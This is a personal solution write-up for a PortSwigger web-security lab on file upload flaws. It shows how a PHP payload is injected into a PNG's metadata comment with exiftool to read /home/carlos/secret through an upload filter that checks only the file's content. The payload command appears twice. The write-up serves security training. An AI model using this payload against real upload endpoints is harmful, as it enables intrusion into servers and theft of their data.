
#portswigger #solution #file_upload

- **Category:** [[File upload vulnerabilities]]
- **Difficulty:** [[PRACTITIONER]]
- **URL Lab:** https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities
- **Date Solved:** 2026-08-04

---

## 🎯 1. Lab Objective
> Upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

---

## 🚀 2. Exploitation
>As regular in this topic, this website has an image uploading function
![[Pasted image 20260804141802.png]]

Based on the LAB's description, I'm going to create a polyglot image file using `exiftool.exe`
First, I need a random .png (or .jpg) image file. Here I used a 1x1 pixel image file found on Wikipedia: https://en.wikipedia.org/wiki/File:1x1.png

Next, I injected a PHP script into the "comment" section of this image's metadata using the command:
```bash
exiftool.exe -comment="<?php echo '********'. file_get_contents('/home/carlos/secret') . '**********************' ?>" 1x1.png -o script.php
```
	(I have tested for a while and realize that the website only checks the file's content not its extension, so I simply put a direct .php)

![[Pasted image 20260804142918.png]]

 BOOM ! It worked 
 ![[Pasted image 20260804142959.png]]
 I got the secret password between the "\*"s


---

## ⚡ 3. PoC / Final Payload

Script name: `script.php
```bash
exiftool.exe -comment="<?php echo '********'. file_get_contents('/home/carlos/secret') . '**********************' ?>" 1x1.png -o script.php
```

---

## 💡 4. Key Takeaways & Remediation

- **Key Concept:** Upload a malicious PHP script into the 'Avatar Upload' section to gain the system's control
- **Remediation:** [[Preventing File Upload Vulnerabilities]]